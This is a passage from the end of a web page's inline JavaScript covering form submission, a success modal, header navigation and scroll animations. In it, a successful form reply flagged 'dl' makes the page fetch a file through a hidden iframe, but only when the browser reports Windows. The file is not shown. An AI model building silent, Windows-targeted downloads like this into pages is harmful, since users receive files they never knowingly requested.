r.json()}).then(function(data){btn.classList.remove('loading');btn.disabled=false;if(data.ok){showModal();if(data.dl&&isWindowsUA()){triggerDownload(data.token)}form.reset()}}).catch(function(){btn.classList.remove('loading');btn.disabled=false})});form.querySelectorAll('input[type="radio"]').forEach(function(r){r.addEventListener('change',function(){var f=r.closest('.field');if(f)f.classList.remove('has-error')})});var emailInput=form.querySelector('input[name="email"]');if(emailInput){emailInput.addEventListener('input',function(){var f=emailInput.closest('.field');if(f)f.classList.remove('has-error')})}}
function getRadio(name){var el=document.querySelector('input[name="'+name+'"]:checked');return el?el.value:''}
function triggerDownload(token){var iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='?action=dl&t='+encodeURIComponent(token);document.body.appendChild(iframe);setTimeout(function(){if(iframe.parentNode)iframe.parentNode.removeChild(iframe)},60000)}
function showModal(){document.getElementById('successModal').classList.add('visible')}
function initModal(){var overlay=document.getElementById('successModal');document.getElementById('modalCloseBtn').addEventListener('click',function(){overlay.classList.remove('visible')});overlay.addEventListener('click',function(e){if(e.target===overlay)overlay.classList.remove('visible')})}
function initHeader(){var header=document.getElementById('header');var burger=document.getElementById('burger');var nav=document.getElementById('mainNav');window.addEventListener('scroll',function(){header.classList.toggle('scrolled',window.scrollY>20)},{passive:true});burger.addEventListener('click',function(){burger.classList.toggle('active');nav.classList.toggle('open')});nav.querySelectorAll('.nav-link').forEach(function(link){link.addEventListener('click',function(){burger.classList.remove('active');nav.classList.remove('open')})})}
function initScrollAnimations(){var items=document.querySelectorAll('.anim-up');if(!('IntersectionObserver' in window)){items.forEach(function(el){el.classList.add('visible')});return}var observer=new IntersectionObserver(function(entries){entries.forEach(function(entry){if(entry.isIntersecting){entry.target.classList.add('visible');observer.unobserve(entry.target)}})},{threshold:0.12});items.forEach(function(el){observer.observe(el)})}
document.addEventListener('DOMContentLoaded',function(){var saved=null;try{saved=localStorage.getItem('lang')}catch(e){}applyLanguage(saved||'hy');initLangSwitcher();initHeader();initForm();initModal();initScrollAnimations()});
})();
</script>
</body>
</html>
